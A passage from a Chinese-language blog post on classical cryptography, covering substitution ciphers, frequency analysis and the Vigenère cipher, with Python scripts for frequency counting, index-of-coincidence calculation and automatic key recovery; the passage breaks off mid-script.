class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mn>26</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>26</mn><mo>=</mo><mn>312</mn></mrow><annotation encoding="application/x-tex">\phi(26)*26=312</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ϕ</span><span class="mopen">(</span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mord">2</span></span></span></span> 遍历起来还是很快的。</p><p>仿射密码是线性的，于是为了提高加密强度，便出现了非线性加密方式，比如以下的单表代替。</p><h2 id="monoalphabetic-substitution-ciphers"><a class="markdownIt-Anchor" href="#monoalphabetic-substitution-ciphers"></a> Monoalphabetic Substitution Ciphers</h2><p>单表代替密码，其实就是用了一张表，将明文中的字母做一个转换，形成密文。</p><p>它的密钥空间十分庞大，即把每一种表的可能都试一遍，当然这个表中的字母不能重复，所以密钥空间是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>26</mn><mo stretchy="false">!</mo><mo>=</mo><mn>403291461126605635584000000</mn></mrow><annotation encoding="application/x-tex">26! = 403291461126605635584000000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">0</span><span class="mord">3</span><span class="mord">2</span><span class="mord">9</span><span class="mord">1</span><span class="mord">4</span><span class="mord">6</span><span class="mord">1</span><span class="mord">1</span><span class="mord">2</span><span class="mord">6</span><span class="mord">6</span><span class="mord">0</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">5</span><span class="mord">5</span><span class="mord">8</span><span class="mord">4</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span>。</p><p>从表面上来看，单表代替貌似十分危险，毕竟很难通过暴力测试的方式得到明文。</p><p>但是这种单表替换中传承了一个英语的巨大的特征——字母的频率。</p><p><img src="https://upyun.wuuconix.link/image-20210910194424282.png" alt="单词的频率" /></p><p>我们可以分析明文中各个字母的频率来猜测字母的对应顺序。</p><p>以下是统计给定字符串中各个字母的个数并按降序排序的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">dict</span> = &#123;&#125;<br>ciphertext = sys.argv[<span class="hljs-number">1</span>]<br>alphanum = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>    <span class="hljs-keyword">if</span> (i.isalpha()):<br>        <span class="hljs-keyword">if</span> (i.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>.keys()): <span class="hljs-comment">#已经有键</span><br>            <span class="hljs-built_in">dict</span>[i.lower()] += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">dict</span>[i.lower()] = <span class="hljs-number">1</span><br>        alphanum += <span class="hljs-number">1</span><br><span class="hljs-built_in">dict</span> = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">dict</span>.items(), key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210910200837065.png" alt="运行效果" /></p><p>为了消除密文中的这种频率信息，又有了多表代替密码和多名代替密码。</p><h2 id="vigenere-cipher"><a class="markdownIt-Anchor" href="#vigenere-cipher"></a> Vigenere Cipher</h2><p>维吉尼亚密码就是一种多表代替密码<code>Polyalphabetic Substituton Ciphers</code>。下面我用我的理解来说一下为什么维吉尼亚密码是一种多表代替密码。</p><p>假设维吉尼亚的密钥只有一个字母&quot;b&quot;。由于在维吉尼亚密码中&quot;a&quot;实际上是0，那么&quot;b&quot;就是1，所以实际上这时就是偏移为1的移位密码。效果如下。</p><p><img src="https://upyun.wuuconix.link/image-20210910210733656.png" alt="vigenere one word key" /></p><p>而这里其实就是一张特殊的单表。</p><div class="center"><table><thead><tr><th style="text-align:center">A</th><th style="text-align:center">B</th><th style="text-align:center">C</th><th style="text-align:center">D</th><th style="text-align:center">E</th><th style="text-align:center">…</th></tr></thead><tbody><tr><td style="text-align:center">B</td><td style="text-align:center">C</td><td style="text-align:center">D</td><td style="text-align:center">E</td><td style="text-align:center">F</td><td style="text-align:center">…</td></tr></tbody></table></div><p>所以这里也可以看到凯撒密码和移位密码都属于单表密码，都可以用频率分析来得到明文。</p><p>而如果维吉尼亚密钥中有两个字母呢？比如说&quot;bc&quot;。很容易想到，这时候其实是有两张表的。奇数位明文用的是&quot;b&quot;的表，而偶数位明文用的是&quot;c&quot;的表。</p><p>这就是我理解的<code>多表</code>。</p><p>维吉尼亚加密起来非常简单，其实就是做一个ascii变化。代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>plaintext = sys.argv[<span class="hljs-number">1</span>].lower()<br>key = sys.argv[<span class="hljs-number">2</span>].lower()<br>ciphertext = <span class="hljs-string">&quot;&quot;</span><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> plaintext:<br>    <span class="hljs-keyword">if</span> (i.isalpha()):<br>        ciphertext += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + (<span class="hljs-built_in">ord</span>(key[num % <span class="hljs-built_in">len</span>(key)]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>        num +=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        ciphertext += i<br><span class="hljs-built_in">print</span>(ciphertext)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210910211729273.png" alt="vigenere加密脚本" /></p><p>如果知道密钥的话，解密也是十分简单的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>ciphertext = sys.argv[<span class="hljs-number">1</span>].lower()<br>key = sys.argv[<span class="hljs-number">2</span>].lower()<br>plaintext = <span class="hljs-string">&quot;&quot;</span><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>    <span class="hljs-keyword">if</span> (i.isalpha()):<br>        plaintext += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - (<span class="hljs-built_in">ord</span>(key[num % <span class="hljs-built_in">len</span>(key)]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>        num +=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        plaintext += i<br><span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210910212347830.png" alt="vigenere解密" /></p><p>那如果我们不知道密钥如何破解维吉尼亚密码呢？由于密钥中每个字母都单独对应一个移位密码表，这就导致明文中同一个字母可能被不同的表加密，从而产生出不同的密文字母，从而整体的频率信息将被破化。看似是坚不可摧了。不知道密文，密钥空间将成为<code>26^n</code>，同时还”消除“了单表代替拥有的频率信息。</p><p>实际上频率信息仍然存在着，只不过不是整体的密文体现出来的，我们需要对密文进行分组，分组的依据是模密文长度的余数。</p><p>比如这个将 “wuuconixyyds” 用 &quot;abc&quot;加密产生的密文 “wvwcppiyayeu”。将密文每三个分为一组。</p><div class="center"><table><thead><tr><th style="text-align:center">wciy</th><th style="text-align:center">vpye</th><th style="text-align:center">wpau</th></tr></thead><tbody></tbody></table></div><p>可以看到，分好之后，每组的密文字母加密时其实用的都是同一个表，比如&quot;wciy&quot;实际上都是用&quot;a&quot;的表，其实就是没动2333。</p><p>其实也就是由于密钥是循环使用的，会导致分组之后的密文重新表现出英文字母的频率性。</p><p>说是频率性，其实每一组密文都是移位后的结果 ，我们完全可以遍历所有的偏移来尝试。</p><p>但是这里有一个问题，平常我们破解移位密码的时候，就是遍历所有的移位，然后观察每种可能移位解密的结果，去看文本是否有意义。但是这里每组的字母在密文整体中是分散的，这就导致我们无法通过肉眼去判断尝试的偏移是否正确，从而无法判断。</p><p>那不弄偏移了，直接看频率来分析。但是很快就也会发现这个问题，我们在破解单表密码的频率分析中充斥着<code>猜测</code>。因为许多字母的频率都是十分相近，除了能够远超其他 字母的<code>e</code>一马当先，其他字母我们都需要代入文本，看看是否组成某个单词等等来猜测。这时我们遇到了和爆破移位同样的问题，即组内密文是离散的，它们无法组成有意义的单词或句子，我们就无法进行猜测了。</p><img src="https://upyun.wuuconix.link/image-20210911141647992.png" style="zoom:67%;" /><p>这个问题困扰了我很久，便去咨询了密码学大佬<code>shrimpwr</code>。他给出了一个方法，即遍历了偏移，又分析了频率，而且分析的频率不依靠人眼，而真正依靠数学，可以实现全自动化破译。</p><p>过程如下。</p><p><img src="https://upyun.wuuconix.link/image-20210911135603797.png" alt="shrimpwr" /></p><p>大体就是去统计密文中各个字母的频率，从&quot;a&quot;到&quot;z&quot;的频率分别和正常文本的“a”到&quot;z&quot;的频率相乘，并把这26个乘数相加，得到一个<code>相关值 Correlation</code>。</p><p>然后去模拟偏移，得到26个相关值，这26个相关值中的最大值对应的偏移就是移位的偏移。</p><p>为什么正确的偏移的时候相关值最大呢？因为正确偏移的时候，我们相当于做了一遍&quot;a&quot;乘&quot;a&quot;的频率加到&quot;z&quot;乘&quot;z&quot;的频率，即各个字母频率的平方和。在这种情况下 ，最大的频率e会乘上自己，强强联合，实现最大值，最小的频率会乘上自己，自生自灭，不去影响别的大频率，我们想象一下也能得到这种情况是得到的总和是最大的。利用这种方法我们根本就不需要去手动尝试，直接就得出结果了。</p><p>以下是脚本 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">q=[ <span class="hljs-number">0.08167</span>, <span class="hljs-number">0.01492</span>, <span class="hljs-number">0.02782</span>, <span class="hljs-number">0.04253</span>, <span class="hljs-number">0.12702</span>, <span class="hljs-number">0.02228</span>, <span class="hljs-number">0.02015</span>, <span class="hljs-number">0.06094</span>, \<br>    <span class="hljs-number">0.06966</span>, <span class="hljs-number">0.00153</span>, <span class="hljs-number">0.00772</span>, <span class="hljs-number">0.04025</span>, <span class="hljs-number">0.02406</span>, <span class="hljs-number">0.06749</span>, <span class="hljs-number">0.07507</span>, <span class="hljs-number">0.01929</span>, \<br>    <span class="hljs-number">0.00095</span>, <span class="hljs-number">0.05987</span>, <span class="hljs-number">0.06327</span>, <span class="hljs-number">0.09056</span>, <span class="hljs-number">0.02758</span>, <span class="hljs-number">0.00978</span>, <span class="hljs-number">0.02360</span>, <span class="hljs-number">0.00150</span>, \<br>    <span class="hljs-number">0.01974</span>, <span class="hljs-number">0.00074</span> ] <span class="hljs-comment">#一般文本a~z频率</span><br><span class="hljs-built_in">dict</span> = &#123;&#125; <span class="hljs-comment">#密文各个字母的个数</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>): <span class="hljs-comment">#各字母个数初始化为0</span><br>    <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + i)] = <span class="hljs-number">0</span><br><br>ciphertext = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ciphertext.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#文本中读入密文</span><br>    ciphertext = f.read().lower()<br><br>alphanum = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>    <span class="hljs-keyword">if</span> (i.isalpha()):<br>        <span class="hljs-keyword">if</span> (i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dict</span>.keys()):<br>            <span class="hljs-built_in">dict</span>[i] += <span class="hljs-number">1</span><br>        alphanum += <span class="hljs-number">1</span><br><br>p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):<br>    p.append( <span class="hljs-built_in">round</span>(<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + i)] / alphanum, <span class="hljs-number">3</span>))<br><br>correlations = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>): <span class="hljs-comment">#模拟偏移，计算correlation</span><br>    correlation = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>): <span class="hljs-comment">#26个字母的频率相乘</span><br>        correlation += q[j] * p[(j + i - <span class="hljs-number">26</span>) % <span class="hljs-number">26</span>]<br>    correlations.append(<span class="hljs-built_in">round</span>(correlation, <span class="hljs-number">3</span>))<br><br>shift = correlations.index(<span class="hljs-built_in">max</span>(correlations))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;偏移：<span class="hljs-subst">&#123;shift&#125;</span>  相关值: <span class="hljs-subst">&#123;<span class="hljs-built_in">max</span>(correlations)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-keyword">if</span> i.isalpha():<br>            plaintext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(i) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - shift + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            plaintext += i<br>    f.write(plaintext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;result saved in &#x27;result.txt&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210911140801376.png" alt="get_shift" /></p><p><img src="https://upyun.wuuconix.link/image-20210911140820688.png" alt="result" /></p><p>这种方法甚至对一些很短的句子都有效果。</p><p><img src="https://upyun.wuuconix.link/image-20210911141002457.png" alt="短句子尝试" /></p><p><img src="https://upyun.wuuconix.link/image-20210911141026033.png" alt="result" /></p><p>这个句子中中甚至都没有&quot;e&quot;，要手工去分析频率几乎是噩梦，但是用这种方法就是游刃有余了。</p><p>好了，现在我们对如何破译每组的密文已经很有把握了，那如何对密文进行分组呢？很显然 ，我们需要知道密钥长度。</p><p>但是密钥长度可不是一开始就给你的，破译密钥长度有两种方法，一种是<code>Kasiski Test</code>，它的思路就是由于密钥的循环利用，可能能遇到明文中相同单词用相同密钥部分加密的情况，这就导致密文的一致。我们可以在密文中查找这种一样的，记录它们的距离，距离的公因数就是密钥长度。这种方法感觉脚本编写起来非常麻烦，需要匹配相同字符串，感觉更适合用眼睛看。第二种就十分优秀了，<code>重合指数法</code>，它的思路就是在正常的英文文本中，两个字母重复的概率是接近于&quot;0.065&quot;的，而完全随机的文本的概率则接近&quot;0.038“，而且这个重合指数计算 起来也非常容易，只需要计算字母的频率的平方和即可。所以它非常适合来自动化破解密钥长度。</p><p><img src="https://upyun.wuuconix.link/image-20210911142802198.png" alt="重合指数" /></p><p>下面是一段计算重合指数的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;-h&quot;</span> <span class="hljs-keyword">or</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;--help&quot;</span> <span class="hljs-keyword">or</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;help&quot;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;python3 IndexOfCoincidence.py [-s string] [-f filepath]&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br>ciphertext = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;-s&quot;</span>):<br>    ciphertext = sys.argv[<span class="hljs-number">2</span>].lower()<br><span class="hljs-keyword">elif</span> (sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;-f&quot;</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        ciphertext = f.read().lower()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error. please type -h for more information&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br>f = [] <span class="hljs-comment">#频数</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):<br>    f.append(<span class="hljs-number">0</span>) <span class="hljs-comment">#每个位置对应相依字母，初值置零</span><br>alphancount = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>    <span class="hljs-keyword">if</span> i.isalpha():<br>        f[<span class="hljs-built_in">ord</span>(i) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)] += <span class="hljs-number">1</span><br>        alphancount += <span class="hljs-number">1</span><br>p = [] <span class="hljs-comment">#对应频率</span><br>ioc = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):<br>    p.append(<span class="hljs-built_in">round</span>(f[i] / alphancount, <span class="hljs-number">3</span>))<br>    ioc += (f[i] / alphancount) ** <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">round</span>(ioc, <span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><p>我们尝试一下不同的文本，来看看它们的重合指数。</p><p><img src="https://upyun.wuuconix.link/image-20210911211831633.png" alt="文本1" /></p><p><img src="https://upyun.wuuconix.link/image-20210911211904400.png" alt="0.0781" /></p><p>高于正常文本的0.065。</p><p><img src="https://upyun.wuuconix.link/image-20210911211948437.png" alt="简爱中的一句话" /></p><p><img src="https://upyun.wuuconix.link/image-20210911212026386.png" alt="0.0732" /></p><p>这里简爱中的一句话比之前的flag更加接近理想值。</p><p><img src="https://upyun.wuuconix.link/image-20210911212116068.png" alt="简爱中的一段" /></p><p><img src="https://upyun.wuuconix.link/image-20210911212144956.png" alt="0.0674" /></p><p>当尝试简爱中的一个段落的重合指数时更加接近理想值。</p><p><img src="https://upyun.wuuconix.link/image-20210911212242816.png" alt="简爱第一章" /></p><p><img src="https://upyun.wuuconix.link/image-20210911212308518.png" alt="0.065" /></p><p>当我们把目标变成简爱的第一个章节的时候，重合指数已经稳稳的变成理想值了。</p><p>在确定密钥长度时，我利用的方法是计算和理想值的差值，差值最小的那组就是密钥的长度。但是这就需要要求密文的文本较长，否则就像这里的第一个和第二个例子，与理想值差的有些多了，到时候差值也会很大，很可能就被认为不是密钥长度了。</p><p>以下是我的维吉尼亚密码最终解密脚本，包含输入密钥的普通解密和不输入密钥的自动破译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key_length</span>(<span class="hljs-params">ciphertext</span>):<br>    dict_model = &#123;&#125; <span class="hljs-comment">#记录组内各个字母的个数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):<br>        dict_model[<span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + i )] = <span class="hljs-number">0</span><br>    differences = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        ll = [] <span class="hljs-comment">#存各组密文字典的列表 </span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, i): <span class="hljs-comment">#加入对应个数的字典</span><br>            <span class="hljs-built_in">dict</span> = copy.deepcopy(dict_model) <span class="hljs-comment">#深拷贝，防止一个变了另一个也变</span><br>            ll.append(<span class="hljs-built_in">dict</span>) <br>        num = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ciphertext:<br>            <span class="hljs-keyword">if</span> c.isalpha():<br>                ll[num % i][c] += <span class="hljs-number">1</span><br>                num += <span class="hljs-number">1</span><br>        difference = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">dict</span> <span class="hljs-keyword">in</span> ll:<br>            ioc = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):<br>                ioc += (<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + j )] / (num // i)) ** <span class="hljs-number">2</span> <span class="hljs-comment">#注意这里每组的ioc除以的总数是单组的字母总数，而不是所有的字母总数</span><br>            difference += <span class="hljs-built_in">abs</span>(ioc - <span class="hljs-number">0.065</span>) <span class="hljs-comment">#计算重合指数和0.065的绝对差值</span><br>        differences.append(<span class="hljs-built_in">round</span>(difference / i, <span class="hljs-number">3</span>))    <span class="hljs-comment">#平均插值</span><br><br>    key_length = differences.index(<span class="hljs-built_in">min</span>(differences)) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> key_length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_shift</span>(<span class="hljs-params">ciphertext</span>):<br>    q=[ <span class="hljs-number">0.08167</span>, <span class="hljs-number">0.01492</span>, <span class="hljs-number">0.02782</span>, <span class="hljs-number">0.04253</span>, <span class="hljs-number">0.12702</span>, <span class="hljs-number">0.02228</span>, <span class="hljs-number">0.02015</span>, <span class="hljs-number">0.06094</span>, \<br>    <span class="hljs-number">0.06966</span>, <span class="hljs-number">0.00153</span>, <span class="hljs-number">0.00772</span>, <span class="hljs-number">0.04025</span>, <span class="hljs-number">0.02406</span>, <span class="hljs-number">0.06749</span>, <span class="hljs-number">0.07507</span>, <span class="hljs-number">0.01929</span>, \<br>    <span class="hljs-number">0.00095</span>, <span class="hljs-number">0.05987</span>, <span class="hljs-number">0.06327</span>, <span class="hljs-number">0.09056</span>, <span class="hljs-number">0.02758</span>, <span class="hljs-number">0.00978</span>, <span class="hljs-number">0.02360</span>, <span 